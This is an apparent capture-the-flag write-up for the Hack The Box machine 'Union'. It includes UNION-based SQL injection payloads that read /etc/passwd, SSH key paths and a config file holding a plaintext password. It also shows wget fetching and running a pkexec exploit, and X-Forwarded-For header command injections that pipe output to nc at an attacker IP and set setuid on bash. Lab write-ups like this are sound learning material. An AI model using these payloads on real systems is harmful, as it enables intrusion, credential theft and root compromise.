# Union

## General information

<h3>Difficulty: <img src="https://img.shields.io/badge/medium-orange?style=flat-square"> </h3>

<h3>Operating system: Linux </h3>

<h3>Vulnerabilidad explotada. SQLI, pkexec and HTTP Header Manipulation 
(X-Forwarded-For)</h3>

<h3>Date os resolution: 18/07/2025</h3>

<h3>Link: <a href="https://app.hackthebox.com/machines/Union" target="_blank">Union</a></h3>

### *Read this document in espagnol* <a href="union.md">Union</a>

## Recognition

HTB provides us with the IP of the target machine **10.10.11.128**

I'm going to set the IP of the target machine in the **/etc/hosts** file. I'm going to call it **union**.

### Ping

Depending on the result we can deduce whether it is a Linux or Windows machine, for example:

```
ping -c 1 union
```

**The ttl is 63, so it's Linux**

### Open Port Scanning

#### TCP Port Scanning

The command I use with nmap is:

```
sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn union
```

<p align="center"> 
<img src="images/nmap.png" width="600" alt="Resultado de Nmap">
</p>

<div align="center">

| Open port | Service | Version                |
| --------- | ------- | ---------------------- |
| 80        | http    | nginx 1.18.0  (ubuntu) |

</div>

## Exploration

```
http://union/
```

<p align="center"> 
<img src="images/union.png" width="600" alt="Resultado de Nmap">
</p>

In this section we will do different tests

### First test

We put our name or anything

```
dani
```

<p align="center"> 
<img src="images/dani.png" width="600" alt="Resultado de Nmap">
</p>

This will take us to the path **challenge.php** and ask us to enter a flag

<p align="center"> 
<img src="images/flag.png" width="600" alt="Resultado de Nmap">
</p>

Since I don't have a flag, we go back to the previous step. I try another name, **pedro**, and the result is the same. So, after a little research, the idea here is to try different SQL injection commands and, based on the response I get, analyze what we can conclude. Therefore, we start with the **SQL injections** manually, since doing it automatically with sqlmap would trigger a **WAF** error.

## Exploitation

### SQLI

For a better view, we will do all this in **burp suite**. There is an extension for the Firefox browser called **foxyproxy**, which is used to easily activate the proxy for **burp suit**. In this <a href="https://www.youtube.com/watch?v=ymfh0LS9OHc" target="_blank">video</a> he explains it very well. We'll pass the page information to **repeater**. We'll run the various SQL injection tests in the **player** parameter.

### SQLi Commands

```
" OR "" = "
```

<p align="center"> 
<img src="images/sqli.png" width="600" alt="Resultado de Nmap">
</p>

*Congratulations  " or "" = " you may compete in this tournament!*

We observe that it gives us a different answer, without the **here**

`UNION` is a keyword in SQL used to combine the results of two queries into a single list. It also matches the HTB machine name.

```
dani'union select 1-- -
```

<p align="center"> 
<img src="images/sqli2.png" width="600" alt="Resultado de Nmap">
</p>

*Sorry, **november** you are not eligible due to already qualifying.*

We found a database called **november**

```
dani'union select version()-- -
```

Sorry, **8.0.27-0ubuntu0.20.04.1** you are not eligible due to already qualifying.

I got the database version

```
dani'union select user()-- -
```

I get a potential user called **uhc**

With **load_file()** I can load a file from the system

```
dani' union select load_file("/etc/passwd")-- -
```

<p align="center"> 
<img src="images/passwd.png" width="600" alt="Resultado de Nmap">
</p>

With this, we can see the total number of users this system contains **htb and uhc**

It works for me... I could try the following...

```
dani' union select load_file("/home/uhc/user.txt")-- -
```

<p align="center"> 
<img src="images/flag1.png" width="600" alt="Resultado de Nmap">
</p>

We get the first **Flag**

Next, we try to get **id_rsa** for both users

```
dani' union select load_file("/home/uhc/.ssh/id_rsa")-- -
dani' union select load_file("/home/htb/.ssh/id_rsa")-- -
```

**We didn't get anything**

At this point it would be good to list the database that exists, so we will execute the following commands

```
dani' union select schema_name from information_schema.schemata limit 0,1-- -
dani' union select schema_name from information_schema.schemata limit 1,1-- -
dani' union select schema_name from information_schema.schemata limit 2,1-- -
dani' union select schema_name from information_schema.schemata limit 3,1-- -
dani' union select schema_name from information_schema.schemata limit 4,1-- -
```

Another way to see all the databases in one line would be to use **group_concat**:

```
dani' union select group_concat(schema_name) from information_schema.schemata-- -
```

*Sorry, **mysql,information_schema,performance_schema,sys,november** you are not eligible due to already qualifying.*

Next, we will list the database table **november**

```
dani' union select group_concat(table_name) from information_schema.tables where table_schema="november"-- -
```

*Sorry, **flag**,**players** you are not eligible due to already qualifying.*

The tables in the **november** database are **flag and players**.

Another way to do this is:

```
dani' union select group_concat(table_name,":",column_name) from information_schema.columns where table_schema="november"-- -
```

Sorry, **flag:one**, **players:player** you are not eligible due to already qualifying.

Now, we can read the content like this

```
dani' union select group_concat(player) from players-- -
```

Sorry, **ippsec,celesian,big0us,luska,tinyboy** you are not eligible due to already qualifying.

Users who cannot be chosen

```
dani' union select group_concat(one) from flag-- -
```

*Sorry, **UHC{F1rst_5tep_2_Qualify}** you are not eligible due to already qualifying.*

I just got the user flag.

If I enter this flag where... I was previously asked for a flag, the following will happen:

<p align="center"> 
<img src="images/ssh.png" width="600" alt="Resultado de Nmap">
</p>

If we run nmap again, we'll find the following surprise:

```
sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn union
```

<p align="center"> 
<img src="images/nmap2.png" width="600" alt="Resultado de Nmap">
</p>

We haven't done any web fuzzing yet, but we're going to do it.

### Fuzzing web

```
gobuster dir -u http://union -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,py,php,sh
```

<p align="center"> 
<img src="images/gobuster.png" width="600" alt="Resultado de Nmap">
</p>

The **config.php** seems very curious to me, let's try to read it from burp suite, we must take into account that we can find this in the path **/var/www/html/** which is the path where these files are usually terminated in CTFs

```
dani' union select load_file("/var/www/html/config.php")-- -
```

<p align="center"> 
<img src="images/config.png" width="600" alt="Resultado de Nmap">
</p>

**User** uhc\
**Password** uhc-11qual-global-pw

Since we have the **ssh** port open, we will take advantage of it.

```
ssh uhc@union
```

<p align="center"> 
<img src="images/uhc.png" width="600" alt="Resultado de Nmap">
</p>

**We're in** I'll be honest, what we've done had never occurred to me in my life. I mean, in my personal opinion, this machine is proving to be the most interesting.

## PostExplotation

### Privilege Escalation

#### First Form:

```
sudo -l
```

We do it with the user **uhc**

*Sorry, user uhc may not run sudo on union.*

#### Second Form:

```
find / -perm -4000 2>/dev/null
```

<p align="center"> 
<img src="images/find.png" width="600" alt="Resultado de Nmap">
</p>

As we have done on several occasions, the **pkexec** binary is present again, let's perform the escalation with this binary.

We downloaded the exploit <a href="https://github.com/NxPnch/pkexec-exploit" target="_blank">here</a>

Then on the attacking machine we use this command:

```
python3 -m http.server 80
```

<p align="center"> 
<img src="images/cve.png" width="600" alt="Resultado de Nmap">
</p>

On the victim machine, we go to the **/tmp** folder

```
wget http://10.10.14.11/CVE-2021-4034.py
chmod +x CVE-2021-4034.py
./CVE-2021-4034.py
n
whoami
```

<p align="center"> 
<img src="images/root.png" width="600" alt="Resultado de Nmap">
</p>

#### Form Third

The **firewall.php** file should be analyzed.

<p align="center"> 
<img src="images/firewall.png" width="600" alt="Resultado de Nmap">
</p>

The application allows you to modify the server's firewall (iptables) to authorize SSH access based on the `X-Forwarded-For` header, which can be manipulated by the user. If an attacker obtains a valid session cookie, they can forge this header to force the server to allow connections from any IP address. This represents a critical risk, as it allows them to bypass network restrictions and gain unauthorized SSH access.

Then we execute this command on our attacker's machine:

```
sudo tcpdump -i tun0 icmp -n
```

On our victim machine:

```
curl -s -X GET http://union/firewall.php -H "X-FORWARDED-FOR: 1.1.1.1; ping -c 1 10.10.14.12;" -H "Cookie: PHPSESSID=ui2bh1mgktnof7bq2ore5qarpc"
```

We use that specific session cookie that will be used to ping our attacking machine.

<p align="center"> 
<img src="images/dump.png" width="600" alt="Resultado de Nmap">
</p>

We've received and sent the packet. So, this way, we can query who the user is.

We set up the listening port on our attacking machine.

```
nc -lvp 4444
```

On our victim machine

```
curl -s -X GET http://union/firewall.php -H "X-FORWARDED-FOR: 1.1.1.1; whoami | nc 10.10.14.12 4444;" -H "Cookie: PHPSESSID=ui2bh1mgktnof7bq2ore5qarpc"
```

<p align="center"> 
<img src="images/lvp.png" width="600" alt="Resultado de Nmap">
</p>

Now I want to know what type of permissions that user www-data has.

We set up the listening port on our attacking machine.

```
nc -lvp 4444
```

On our victim machine

```
curl -s -X GET http://union/firewall.php -H "X-FORWARDED-FOR: 1.1.1.1; sudo -l | nc 10.10.14.12 4444;" -H "Cookie: PHPSESSID=ui2bh1mgktnof7bq2ore5qarpc"
```

<p align="center"> 
<img src="images/4444.png" width="600" alt="Resultado de Nmap">
</p>

That means you have root permission.

Therefore, we'll focus on using this command: **sudo chmod u+s /bin/bash** This assigns the UID permission to bash, and the command would be:

```
curl -s -X GET http://union/firewall.php -H "X-FORWARDED-FOR: 1.1.1.1; sudo chmod u+s /bin/bash | nc 10.10.14.12 4444;" -H "Cookie: PHPSESSID=ui2bh1mgktnof7bq2ore5qarpc"
```

Then, with this command we verify

```
ls -l /bin/bash
```

<p align="center"> 
<img src="images/bin.png" width="600" alt="Resultado de Nmap">
</p>

Just by running this command we already obtain the elevated privilege

```
bash -p
```

<p align="center"> 
<img src="images/bash.png" width="600" alt="Resultado de Nmap">
</p>

-------------------------------------------------------

**To get the root flag**

```
cd /root
cat root.txt
```

<p align="center"> 
<img src="images/root1.png" width="600" alt="Resultado de Nmap">
</p>

## Conclusion

This machine seemed one of the most complicated to me, especially due to the SQLI exploitation, as it was a topic I was barely familiar with and I didn't fully understand how it worked at first. However, thanks to all the new commands I've learned, I've come to understand how custom payloads are constructed and used to perform an effective injection. If you find yourself in a similar situation, don't hesitate to thoroughly investigate how these attacks work, because it's worth it.

As for privilege escalation, the method using the vulnerable pkexec binary seemed quite straightforward and easy to execute. However, the machine also offers a second, much more complex and interesting route: through the X-Forwarded-For header, which can be manipulated by the user. This technique was completely new to me, and I relied on a valid session cookie, obtained with Burp Suite, to spoof the IP address and obtain user data, thus achieving privilege escalation.

All in all, a surprisingly good machine that blends multiple vectors and has taught me a lot in the process.